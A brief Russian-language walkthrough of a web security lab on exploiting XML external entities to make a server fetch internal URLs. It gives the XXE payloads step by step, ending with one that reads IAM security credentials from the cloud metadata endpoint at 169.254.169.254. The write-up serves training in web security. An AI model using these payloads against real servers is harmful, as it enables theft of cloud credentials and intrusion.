## Lab: Exploiting XXE to perform SSRF attacks
1) Переходим на сайт задания и выбираем любой продукт.
2) Нажимаем "Check stock" и перехватываем запрос через Burp Suite.
3) Между объявлением xml и stockCheck вставляем:
```php
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
4) Значение в productId меняем на &xxe;
5) Отправляем запрос и в ответ получим latest. Добавим его к адресу:
```php
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]>
```
6) Снова отправляем запрос и дальше вставляем в адрес ответы, пока не дойдем до:
```php
  <!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
```
![](https://github.com/NaylyaZh99/hacking/blob/master/lab%20XXE/task2/image.png)

Готово!
